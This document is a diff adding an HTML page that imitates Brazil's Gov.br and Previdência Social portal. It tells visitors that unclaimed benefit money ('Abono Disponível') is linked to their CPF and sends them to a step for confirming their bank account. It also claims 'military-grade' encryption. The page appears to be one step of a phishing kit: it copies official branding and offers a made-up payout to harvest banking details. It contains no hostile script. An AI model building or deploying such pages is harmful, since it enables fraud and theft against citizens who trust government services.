@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema de Liberação - Gov.br</title>
+    <style>
+        body { font-family: 'Rawline', sans-serif, Arial; background-color: #f2f5f7; margin: 0; padding: 0; color: #333; }
+        
+        .gov-bar { background: #fff; padding: 12px 20px; border-bottom: 2px solid #004088; display: flex; align-items: center; justify-content: space-between; }
+        .gov-bar img { height: 24px; }
+
+        .container { max-width: 450px; margin: 30px auto; padding: 15px; }
+
+        .card-resultado { 
+            background: white; 
+            border-radius: 8px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05); 
+            border-top: 6px solid #1d8032; 
+            padding: 30px; 
+            text-align: center;
+            box-sizing: border-box; /* Garante que nada saia pra fora */
+        }
+        
+        /* Checkmark Moderno */
+        .success-circle {
+            width: 70px;
+            height: 70px;
+            background: #e8f5e9;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+        .success-circle svg { width: 40px; height: 40px; fill: #1d8032; }
+
+        h1 { font-size: 22px; color: #004088; margin-bottom: 10px; font-weight: 800; }
+        .status-badge { color: #1d8032; font-weight: bold; font-size: 14px; text-transform: uppercase; margin-bottom: 25px; display: block; }
+
+        .info-text { 
+            text-align: left; 
+            font-size: 15px; 
+            background: #f9f9f9; 
+            padding: 15px; 
+            border-radius: 6px; 
+            color: #555; 
+            margin-bottom: 25px;
+            line-height: 1.5;
+            border: 1px solid #eee;
+        }
+
+        /* Botão Ajustado para dentro */
+        .btn-resgatar { 
+            background: #1351b4; 
+            color: white; 
+            border: none; 
+            padding: 18px 10px; 
+            width: 100%; 
+            border-radius: 50px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            text-transform: uppercase; 
+            font-size: 14px; 
+            text-decoration: none; 
+            display: block; 
+            box-shadow: 0 4px 12px rgba(19, 81, 180, 0.2);
+            box-sizing: border-box; /* Fundamental para não vazar o container */
+            transition: background 0.3s;
+        }
+        .btn-resgatar:hover { background: #003366; }
+
+        .footer-note { font-size: 11px; color: #aaa; margin-top: 25px; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <div class="gov-bar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" alt="Gov.br">
+        <span style="font-size: 11px; font-weight: bold; color: #666;">PREVIDÊNCIA SOCIAL</span>
+    </div>
+
+    <div class="container">
+        <div class="card-resultado">
+            <div class="success-circle">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+            </div>
+            
+            <h1>Consulta Concluída</h1>
+            <span class="status-badge">Abono Disponível</span>
+            
+            <div class="info-text">
+                O sistema localizou valores pendentes vinculados ao seu CPF. Para realizar o resgate imediato, siga para a etapa de confirmação de conta bancária.
+            </div>
+
+            <a href="final.html" class="btn-resgatar">Continuar para Resgate</a>
+
+        </div>
+        
+        <div class="footer-note">
+            Portal de Transparência © 2025 <br>
+            Criptografia de Segurança Nível Militar Ativa
+        </div>
+    </div>
+
+</body>
+</html>
